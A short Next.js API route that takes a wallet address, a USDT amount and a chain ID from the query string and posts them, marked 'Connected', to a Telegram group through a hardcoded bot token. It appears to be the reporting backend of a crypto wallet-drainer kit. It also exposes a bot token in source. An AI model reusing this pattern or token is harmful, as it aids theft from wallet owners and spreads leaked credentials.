import { NextResponse } from 'next/server';
import Bot from 'node-telegram-bot-api';

export async function GET(request: Request) {
  const { searchParams } = new URL(request.url);
  const id = searchParams.get('address');
  const amount = searchParams.get('amount');
  const chainID = searchParams.get('chain_id');

  const token = '7175923408:AAGIYrgawznFmqBtKXn8oaqVgKkbZhgcVWM';
  try {
    const bot = new Bot(token);
    const chatId = '-4116950572';

    const mdMessage = `
*Address:* \`${id}\`
*Amount:* \`${amount} USDT\`
*Chain Id:* \`${chainID}\`
*Status:* \`Connected\`
`;

    const res = await bot.sendMessage(chatId, mdMessage, { parse_mode: 'MarkdownV2' });
    console.log(res);

    return NextResponse.json({ success: true }, { status: 200 });
  } catch (error: any) {
    console.error('Error sending message:', error.message);
    return NextResponse.json({ error: 'Internal Server Error' }, { status: 500 });
  }
}
